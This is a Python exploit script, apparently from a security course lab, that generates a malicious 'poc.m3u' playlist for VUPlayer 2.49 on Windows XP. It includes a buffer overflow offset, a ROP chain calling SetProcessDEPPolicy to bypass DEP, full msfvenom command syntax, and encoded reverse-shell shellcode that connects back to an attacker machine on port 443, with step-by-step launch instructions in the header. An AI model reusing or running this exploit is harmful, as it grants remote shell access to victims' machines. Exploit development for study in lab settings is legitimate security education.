#----------------------------------------------------------------------------------------
# 
# Git: https://github.com/franky527/8042-a2-exploit/blob/main/README.adoc      
# File Location: C:\Documents and Settings\Administrator\Desktop\Sploit\Exploit2-SetDep.py
# Exploit tested on the following configuraiton:
# Host Machine: Windows XP 2002, Service Pack 3, 32-bit
# Attacking Machine: Kali Linux 2017.2
# Control Panel > System and Security > System > Advanced > Performance - Settings > Data Execution Prevention (Turn on DEP for all application)
#
# Steps to launch exploit:
#	1) Using Command Prompt, run the exploit file; python Exploit2-SetDep.py
#	2) For testing and observation of the exploit, open Immunity Debugger 
#	3) Run VUPlayer 2.49, and open the "poc.m3u" Playlist generated from this Python script
#	4) The shell code in this file will create a TCP shell on Port 443, to the attacking Kali machine on 198.168.100.2 (ZIET8042 Lab Environment) 
#	5) The exploit is confirmed with the shell established from the WinXP victim, to the Kali machine
#
# The SetProcessDEPPolicy() Win32 API was used in the Return Oriented Programming (ROP) Chain for this exploit
# https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy
#
#   BOOL SetProcessDEPPolicy(
#       [in] DWORD dwFlags
#   );
#
# This exploit will bypass Data Execution Prevention (DEP)
# The Windowx XP machine can be set to "Turn on DEP for all programs and services"
#
# The PUSHAD technique was used to set the register values for execution:
#   EDI = ROP NOP (RETN)
#   ESI = ROP NOP (RETN)
#   EBP = SetProcessDEPPolicy()
#   ESP = This is a pointer to the stack (EIP), that is automatically generated pointer to the shellcode once PUSHAD is called
#   EBX = Setting EBX to Zero
#   EDX = ROP NOP (RETN)    
#   ECX = ROP NOP (RETN)   
#   EAX = ROP NOP (RETN)       
#   	
#----------------------------------------------------------------------------------------

# Python module for string conversions
from struct import pack

# Exploit creates the poc.m3u playlist for importing into VUPlayer
with open('poc.m3u', 'w') as f:
    
	# Filling the buffer with 'A' characters, identifed from buffer overflow 
	junk = 'A'*1012
    
    # EIP is set to point to the stack
	eip = pack('L', 0x77AEAAA3)     #pointer to return to the stack
	
    #----------------------------------------------------------------------------------------
    
    # This message is crafted from finding the memory locations of related intructions to set the stack registers 
    # This is a Return Oriented Programming (ROP) chain, crafted to set the stack register values
    # This has considerd bad characters that will stop the shellcode from executing '\x00\x09\x0A\x0d\x1a'
	# The most valuable !mona files for identifying gadgets have been the rop_suggestions and validating with rop_chains files
    
	rop =''
    
    # Setting EBX to Zero
	rop += pack('L', 0x1002ab7d)    #POP EBX # RETN
	rop += pack('L', 0xFFFFFFFF)    #Set value for EBX
	rop += pack('L', 0x73E6BE1C)    #INC EBX # XOR EAX, EAX # RETN
                                    	
	# SetProcessDEPPolicy Address in EBP
	rop += pack('L', 0x77c1de42)  	#POP EBP # RETN 
	rop += pack('L', 0x7C862144)  	#kernel32.SetProcessDEPPolicy
                                        
	# Set ROP NOP in EDI
	rop += pack('L', 0x7cb4021c)	#POP EDI # RETN
	rop += pack('L', 0x77AEAAA3)	#Pointer to RETN 
	
    # Set ROP NOP in ESI
	rop += pack('L', 0x77AEAACC)	#POP ESI # RETN   
	rop += pack('L', 0x77AEAAA3)	#Pointer to RETN 
									
	# the final PUSH AD assembly instruction to execute the intructions in the registers, in order  
	rop += pack('L', 0x7719576d)	#Pointer to PUSHAD # RETN
		 

    #----------------------------------------------------------------------------------------
	# The shell code is generated from kali 2017.2, msfvenom was used, and the output captured for the exploit file as buf
	# msfvenom -n 100 -p windows/shell_reverse_tcp -f python -a x86 --platform windows -b "\x00\x20\x0A\x0d\x1a" -e x86/shikata_ga_nai LHOST=192.168.100.02 LPORT=443 > reverse_tcp.sc
	# The shell code establishes a TCP shell to the attacking Kali machine on 198.168.100.2
    
	buf =  ""
	buf += "\x92\x48\x40\xfc\x4b\x43\xfd\xfc\x42\x99\xd6\x43\x4a"
	buf += "\x37\x49\x4a\xf8\x48\xf8\x9b\x90\x90\xf8\x37\x2f\x9f"
	buf += "\x43\x42\x92\x42\xf8\x48\x48\xfc\x27\x4a\xf8\xfd\x41"
	buf += "\x4a\x93\xf5\x48\x49\x91\x27\x49\x93\x99\x48\x9f\x9b"
	buf += "\x9b\x98\x37\x40\x4a\xfd\x48\xfd\x40\x98\x4b\xfd\x9b"
	buf += "\x49\xfc\x42\xf9\x2f\x48\x9b\x48\x99\x92\x4b\x99\x2f"
	buf += "\xfd\x2f\x90\x41\x41\x49\xf5\x3f\x4a\x4a\xfc\x4a\x4b"
	buf += "\x92\x92\x49\xfd\x9b\x48\x4a\x43\x48\xdd\xc1\xd9\x74"
	buf += "\x24\xf4\x5f\x33\xc9\xba\xc3\x6f\x30\x2c\xb1\x52\x31"
	buf += "\x57\x17\x83\xef\xfc\x03\x94\x7c\xd2\xd9\xe6\x6b\x90"
	buf += "\x22\x16\x6c\xf5\xab\xf3\x5d\x35\xcf\x70\xcd\x85\x9b"
	buf += "\xd4\xe2\x6e\xc9\xcc\x71\x02\xc6\xe3\x32\xa9\x30\xca"
	buf += "\xc3\x82\x01\x4d\x40\xd9\x55\xad\x79\x12\xa8\xac\xbe"
	buf += "\x4f\x41\xfc\x17\x1b\xf4\x10\x13\x51\xc5\x9b\x6f\x77"
	buf += "\x4d\x78\x27\x76\x7c\x2f\x33\x21\x5e\xce\x90\x59\xd7"
	buf += "\xc8\xf5\x64\xa1\x63\xcd\x13\x30\xa5\x1f\xdb\x9f\x88"
	buf += "\xaf\x2e\xe1\xcd\x08\xd1\x94\x27\x6b\x6c\xaf\xfc\x11"
	buf += "\xaa\x3a\xe6\xb2\x39\x9c\xc2\x43\xed\x7b\x81\x48\x5a"
	buf += "\x0f\xcd\x4c\x5d\xdc\x66\x68\xd6\xe3\xa8\xf8\xac\xc7"
	buf += "\x6c\xa0\x77\x69\x35\x0c\xd9\x96\x25\xef\x86\x32\x2e"
	buf += "\x02\xd2\x4e\x6d\x4b\x17\x63\x8d\x8b\x3f\xf4\xfe\xb9"
	buf += "\xe0\xae\x68\xf2\x69\x69\x6f\xf5\x43\xcd\xff\x08\x6c"
	buf += "\x2e\xd6\xce\x38\x7e\x40\xe6\x40\x15\x90\x07\x95\xba"
	buf += "\xc0\xa7\x46\x7b\xb0\x07\x37\x13\xda\x87\x68\x03\xe5"
	buf += "\x4d\x01\xae\x1c\x06\xee\x87\x7a\xd4\x86\xd5\x82\xd9"
	buf += "\xed\x53\x64\xb3\x01\x32\x3f\x2c\xbb\x1f\xcb\xcd\x44"
	buf += "\x8a\xb6\xce\xcf\x39\x47\x80\x27\x37\x5b\x75\xc8\x02"
	buf += "\x01\xd0\xd7\xb8\x2d\xbe\x4a\x27\xad\xc9\x76\xf0\xfa"
	buf += "\x9e\x49\x09\x6e\x33\xf3\xa3\x8c\xce\x65\x8b\x14\x15"
	buf += "\x56\x12\x95\xd8\xe2\x30\x85\x24\xea\x7c\xf1\xf8\xbd"
	buf += "\x2a\xaf\xbe\x17\x9d\x19\x69\xcb\x77\xcd\xec\x27\x48"
	buf += "\x8b\xf0\x6d\x3e\x73\x40\xd8\x07\x8c\x6d\x8c\x8f\xf5"
	buf += "\x93\x2c\x6f\x2c\x10\x5c\x3a\x6c\x31\xf5\xe3\xe5\x03"
	buf += "\x98\x13\xd0\x40\xa5\x97\xd0\x38\x52\x87\x91\x3d\x1e"
	buf += "\x0f\x4a\x4c\x0f\xfa\x6c\xe3\x30\x2f"
	
	#----------------------------------------------------------------------------------------
	# Remaining payload components
	nop = "\x90"*100    # NOP Sled
	shellcode = buf     # The Shellcode
	junk2 = 'Z'*100     # Additional data after the shellcode to observe a clean payload, and no bad characters  

    #----------------------------------------------------------------------------------------      
    # concatenating the payload together for execution:
    #   junk      =   1012 characters for buffer overflow
    #   eip       =   RETN instruction to start ROP chain
    #   rop       =   The set of ROP instructions to set the register values, including the selected WIN32 API
    #   nop       =   NOP Sled
    #   shellcode =   Shellcode
    #   junk2     =   Additional data after the shellcode
	
	payload = junk + eip + rop + nop + shellcode + junk2
	
	#----------------------------------------------------------------------------------------		
	# To review payload file size
	print("[i] Payload size: []", len(payload))
	
	# Writing the payload to file
	f.write(payload)
    
# Confirmation to screen that the file has been generated     
print('[1] Exploit file is generated')											
	
	